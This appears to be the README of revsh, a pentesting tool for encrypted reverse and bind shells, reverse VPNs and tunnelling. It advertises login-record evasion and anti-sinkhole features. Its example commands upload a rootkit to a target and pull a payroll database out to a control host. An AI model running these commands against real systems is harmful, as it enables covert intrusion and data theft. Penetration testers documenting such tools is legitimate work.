# revsh #

## News ##

XXX 

## Information ##

_revsh_ is a tool for establishing [reverse shells](http://en.wikipedia.org/wiki/Reverse_shell) with [terminal](http://en.wikipedia.org/wiki/Computer_terminal) support, reverse [VPNs](https://en.wikipedia.org/wiki/Virtual_private_network) for [advanced pivoting](https://en.wikipedia.org/wiki/Exploit_(computer_security)#Pivoting), as well as arbitrary data tunneling.

**What is a "reverse shell"?**

A reverse shell is a network connection that grants [shell](http://en.wikipedia.org/wiki/Shell_%28computing%29) access to a remote host. As opposed to other remote login tools such as [telnet](http://en.wikipedia.org/wiki/Telnet) and [ssh](http://en.wikipedia.org/wiki/Secure_Shell), a reverse shell is initiated by the remote host. This technique of connecting outbound from the remote network allows for circumvention of firewalls that are configured to block inbound connections only. 

**What is a "reverse VPN"?**

_revsh_ is capable of attaching a virtual ethernet card (tun/tap) to both ends of its crypto tunnel. These cards can then be used to forward raw IP packets or ethernet frames. When combined with an Iptables NAT rule, or bridging a real ethernet card, this allows for the operator to receive a fully routable IP address on the target machines network. This, essentially, is a full VPN that has performed a connect-back call to the operator to circumvent in-bound packet filtering and grant the operator full network access.

**What is a "bind shell"?**

A [bind shell](http://en.wikipedia.org/wiki/Shellcode#Remote) is a shell that is served from a normal forward network connection. _revsh_ supports both reverse and bind shells. To invoke a bind shell you can either invoke the _-b_ flag on both ends of the connection, or invoke the binary as '_bindsh_'.


**Can't I just use [netcat](http://en.wikipedia.org/wiki/Netcat)?**

There are [many techniques](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) for establishing a reverse shell, but these methods don't provide terminal support. _revsh_ allows for a reverse shell whose connection is mediated by a [pseudo-terminal](http://en.wikipedia.org/wiki/Pseudoterminal), and thus allows for features such as:

 * [job control](http://en.wikipedia.org/wiki/Job_control)
 * [control character processing](http://en.wikipedia.org/wiki/Control_character) (e.g [Ctrl-C](http://en.wikipedia.org/wiki/Control-C))
 * [auto-completion](http://en.wikipedia.org/wiki/Auto-completion)
 * support for programs requiring a [controlling tty](https://github.com/emptymonkey/ctty) (e.g. vi)
 * [processing of window re-size events](http://linux.die.net/man/4/tty_ioctl)

In addition, _revsh_ also offers the following features:
 * [UTF-8](http://en.wikipedia.org/wiki/UTF-8) support.
 * Circumvents [utmp / wtmp](http://en.wikipedia.org/wiki/Utmp). (No login recorded.)
 * Processes [rc file](http://en.wikipedia.org/wiki/Run_commands) commands upon login for easy scripting.
 * [OpenSSL](https://www.openssl.org/) encryption with key based authentication baked into the binary.
 * Anonymous [Diffie-Hellman](http://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange) encryption upon request.
 * Ephemeral Diffie-Hellman encryption as default. (Now with more [Perfect Forward Secrecy](http://en.wikipedia.org/wiki/Forward_secrecy)!)
 * [Cert pinning](http://en.wikipedia.org/wiki/Transport_Layer_Security#Certificate_pinning) for protection against [sinkholes](http://en.wikipedia.org/wiki/DNS_sinkhole) and [mitm](http://en.wikipedia.org/wiki/Man-in-the-middle_attack) counter-intrusion.
 * Connection timeout for remote process self-termination.
 * Randomized retry timers for non-predictable auto-reconnection.
 * Netcat style non-interactive data brokering for file transfer.
 * Proxy support: point-to-point, SOCKS 4, SOCKS 4a, and SOCKS 5. Proxys are available in both directions for complete flexibility.
 * TUN / TAP support for forwarding raw IP packets / Ethernet frames.
 * Escape sequence commands to kill non-responsive nodes, or print connection statistics.


_revsh_ is intended as a supplementary tool for a [pentester's](http://en.wikipedia.org/wiki/Pentester) toolkit that provides the full set of terminal features across an encrypted tunnel. All together in a small (~75k) easy to use binary.

**Where can I use _revsh_?**

_revsh_ was developed on x86_64 Linux. Here is a brief list of Arch / OS combinations that it has been used on:
 * x86_64 Linux
 * i686 Linux
 * amd64 FreeBSD

(If you have successfully used revsh on another platform, drop me a line and I'll add it to the list.)

## Usage ##

	empty@monkey:~$ revsh -h
	
	Control:	revsh -c [CONTROL_OPTIONS] [MUTUAL_OPTIONS] [ADDRESS[:PORT]]
	Target:		revsh     [TARGET_OPTIONS] [MUTUAL_OPTIONS] [ADDRESS[:PORT]]
	
	CONTROL_OPTIONS:
	  -c           Run in "command and control" mode.             (Default is target mode.)
	  -a           Enable Anonymous Diffie-Hellman mode.          (Default is Ephemeral Diffie-Hellman.)
	  -d KEYS_DIR  Reference the keys in an alternate directory.  (Default is "~/.revsh/keys/".)
	  -f RC_FILE   Reference an alternate rc file.                (Default is "~/.revsh/rc".)
	  -s SHELL     Invoke SHELL as the remote shell.              (Default is "/bin/bash".)
	  -F LOG_FILE  Log general use and errors to LOG_FILE.        (No default set.)
	
	TARGET_OPTIONS:
	  -t SEC       Set the connection timeout to SEC seconds.     (Default is "3600".)
	  -r SEC1,SEC2 Set the retry time to be SEC1 seconds, or      (Default is "600,1200".)
	               to be random in the range from SEC1 to SEC2.
	
	MUTUAL_OPTIONS:
	  -k           Run in keep-alive mode. Node will neither
	               exit normally, nor seppuku from timeout.
	  -L [LHOST:]LPORT:RHOST:RPORT
	               Static socket forwarding with a local
	               listener at LHOST:LPORT forwarding to
	               RHOST:RPORT.
	  -R [RHOST:]RPORT:LHOST:LPORT
	               Static socket forwarding with a remote
	               listener at RHOST:RPORT forwarding to
	               LHOST:LPORT.
	  -D [LHOST:]LPORT
	               Dynamic socket forwarding with a local
	               listener at LHOST:LPORT.                       (Socks 4, 4a, and 5. TCP connect only.)
	  -B [RHOST:]RPORT
	               Dynamic socket forwarding with a remote
	               listener at LHOST:LPORT.                       (Socks 4, 4a, and 5. TCP connect only.)
	  -x           Disable automatic setup of proxies.            (Defaults: Proxy D2280 and tun/tap devices.)
	  -b           Start in bind shell mode.                      (Default is reverse shell mode.)
	               The -b flag must be invoked on both ends.
	  -n           Non-interactive netcat style data broker.      (Default is interactive w/remote tty.)
	               No tty. Useful for copying files.
	  -v           Verbose. -vv and -vvv increase verbosity.
	  -h           Print this help.
	  -e           Print out some usage examples.
	
	  ADDRESS      The address of the control listener.           (Default is "0.0.0.0".)
	  PORT         The port of the control listener.              (Default is "2200".)


## Installation ##

First, build OpenSSL from source. (See NOTE below.)

	git clone https://github.com/openssl/openssl.git
	cd openssl/
	./config no-shared  # If you are building full static binary, then add the -static flag here.
	make && make test
	cd ..

Now build revsh.

	git clone https://github.com/emptymonkey/revsh.git
	cd revsh
	vi config.h        # Set up new defaults that fit your situation.
	vi Makefile        # By default, we build statically linked OpenSSL, but dynamic libc. You can change that here.
	make               # This *can* take a very long time, though it usually doesn't.
	make install
	vi ~/.revsh/rc     # Add your favorite startup commands to really customize the feel of your remote shell.
	revsh -h

NOTE: With the release of OpenSSL 1.1.0, OpenSSL needs to be built from source for use in a statically linked binary. Building a statically linked binary against the OpenSSL libraries that ship with most Linux distros (including Kali) will not work. (If you get it to build at all, it will SEGFAULT.) At some point in the future, when the recent fixes to OpenSSL 1.1 filter down to the distros, this step will replaced by the appropriate 'apt-get' command.

## Examples ##

Control host example IP: 192.168.0.42
<br>
Target host example IP:  192.168.0.66

	Interactive example on default port '2200':
		control:	revsh -c
		target:		revsh 192.168.0.42
	
	Interactive example on non-standard port '443':
		control:	revsh -c 192.168.0.42:443
		target:		revsh 192.168.0.42:443
	
	Bindshell example:
		target:		revsh -b
		control:	revsh -c -b 192.168.0.66
	
	Non-interactive file upload example:
		control:	cat ~/bin/rootkit | revsh -c -n
		target:		revsh 192.168.0.42 > ./totally_not_a_rootkit
	
	Non-interactive file download example:
		control:	revsh -c -n >payroll_db.tar
		target:		cat payroll_db.tar | revsh 192.168.0.42
	
	Non-interactive file download example across existing tunnel:
		control:	revsh -c -n 127.0.0.1:2291 >payroll_db.tar
		target:		cat payroll_db.tar | revsh 127.0.0.1:2290

